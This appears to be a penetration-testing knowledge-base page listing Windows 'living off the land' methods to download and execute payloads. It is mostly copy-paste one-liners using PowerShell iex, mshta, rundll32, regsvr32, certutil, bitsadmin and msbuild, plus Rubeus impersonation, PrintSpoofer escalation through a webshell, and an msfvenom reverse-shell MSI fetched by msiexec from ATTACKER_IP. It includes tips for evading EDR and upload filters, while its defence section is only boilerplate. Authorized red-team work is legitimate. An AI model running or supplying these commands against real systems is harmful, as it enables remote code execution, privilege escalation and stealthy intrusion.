---
title: Windows - Download and execute methods
type: technique
tags: [initial-access, reference-import, windows]
phase: exploitation
date_created: 2026-05-13
date_updated: 2026-07-02
sources: [InternalAllTheThings]
---

# Windows - Download and execute methods

## What it is

Technical reference for **Windows - Download and execute methods** collected from InternalAllTheThings during an internal/cloud assessment ingest.

## How it works

Windows provides numerous built-in methods for downloading and executing code that can be used without introducing additional tooling: PowerShell `Invoke-WebRequest`/`Net.WebClient`, `certutil.exe -urlcache`, `bitsadmin`, `curl.exe`, and `mshta.exe` for remote execution of HTA files. Attackers choose LOLBins (Living off the Land Binaries) to blend with legitimate system administration activity and avoid triggering detections based on suspicious binary names or file paths. The specific method used depends on which binaries are available, whether they are monitored by the EDR, and whether proxy authentication is required for outbound HTTP.

## Attack phases

- **Exploitation**: primary phase for this note (credential and control-plane abuse)
- **Adjacent phases**: overlaps are common once credentials or lateral paths appear

## Prerequisites

Authorized scope covering the depicted systems; valid credentials or network reach as required by each command block inside the methodology body.

## Methodology

The following imported sections retain upstream ordering, tables, and copy-pasta blocks from InternalAllTheThings.

## Downloaded files location

- `C:\Users\<username>\AppData\Local\Microsoft\Windows\Temporary Internet Files\`
- `C:\Users\<username>\AppData\Local\Microsoft\Windows\INetCache\IE\<subdir>`
- C:\Windows\ServiceProfiles\LocalService\AppData\Local\Temp\TfsStore\Tfs_DAV

## Powershell

From an HTTP server

```powershell
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex"

# Download only
(New-Object System.Net.WebClient).DownloadFile("http://10.10.10.10/PowerUp.ps1", "C:\Windows\Temp\PowerUp.ps1")
Invoke-WebRequest "http://10.10.10.10/binary.exe" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\binary.exe"

# Download and run Rubeus, with arguments
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main("s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator /msdsspn:cifs/file01 /ptt".Split())

# Execute a specific method from an assembly 
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/lib.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```

From a Webdav server

```powershell
powershell -exec bypass -f \\webdavserver\folder\payload.ps1
```

## Cmd

```powershell
cmd.exe /k < \\webdavserver\folder\batchfile.txt
```

## Cscript / Wscript

```powershell
cscript //E:jscript \\webdavserver\folder\payload.txt
```

## Mshta

```powershell
mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
```

```powershell
mshta http://webserver/payload.hta
```

```powershell
mshta \\webdavserver\folder\payload.hta
```

## Rundll32

```powershell
rundll32 \\webdavserver\folder\payload.dll,entrypoint
```

```powershell
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
```

## Regasm / Regsvc @subTee

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
```

## Regsvr32 @subTee

```powershell
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
```

```powershell
regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
```

## Odbcconf

```powershell
odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
```

## Msbuild

```powershell
cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
```

## Certutil

```powershell
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
```

```powershell
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
```

## Bitsadmin

```powershell
bitsadmin /transfer mydownloadjob /download /priority normal http://<attackerIP>/xyz.exe C:\\Users\\%USERNAME%\\AppData\\local\\temp\\xyz.exe
```

## References

- [arno0x0x - Windows oneliners to download remote payload and execute arbitrary code](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)

## Bypasses and variants

Enumerate case-specific bypasses inside the methodologies above when upstream documented alternate paths.

## Detection and defence

Apply vendor baselines for logging, least privilege, patch cadence, and segmentation. Map signals to SOC playbooks relevant to each platform referenced in this page.

## Tools

- Also uses (no dedicated page yet): Rubeus

## Sources

- Swisskyrepo [InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings) (ingest slug `InternalAllTheThings`).

## Staging tools on Windows through a webshell

- `C:\Windows\temp` is periodically cleaned on hardened hosts: binaries dropped there vanish. Stage tools in a directory the compromised service writes to and that survives cleaning, e.g. the app server's own `webapps\` tree, and reference them by full path.
- `certutil -urlcache -f` is intermittently silent for larger binaries (reports success, no file on disk). Prefer Windows-native `curl.exe <url> -o <path>`; always verify with `certutil -hashfile <file> MD5` against the source hash.
- A non-interactive webshell cannot stream tool output: run privileged binaries with output redirected into the served web path, then fetch the file over HTTP.

```text
<staged>\PrintSpoofer64.exe -c "cmd /c whoami > <webapps>\sh\p.txt 2>&1"
curl http://<host>:8080/sh/p.txt
```

PrintSpoofer conditions for this pattern: Spooler running, SeImpersonatePrivilege held, no EDR reaping the binary.

<!-- promoted-slug: webshell-windows-tool-staging -->

## Msiexec (MSI payload delivery)

`msiexec` is a signed Microsoft binary that installs `.msi` packages, and it fetches them over
HTTP/SMB itself, so it doubles as a download-and-execute LOLBIN that survives extension filters
blocking `.exe`:

```powershell
# Generate the package (stageless shell needs only a plain nc listener)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f msi -o shell.msi

# On target, fetch and execute over HTTP in one step (no on-disk staging):
msiexec /q /i http://ATTACKER_IP:80/shell.msi

# Or execute an already-dropped package:
msiexec /q /i shell.msi
```

When to reach for it: upload filters that allow "installer-looking" file types, hosts where
the usual LOLBINs (mshta/rundll32/regsvr32) are blocked or heavily monitored, and phishing
deliveries where an installer extension raises less suspicion. The `/q` flag keeps it silent;
pair with an egress-safe port (443/80).

<!-- promoted-slug: windows-msiexec-payload-delivery -->
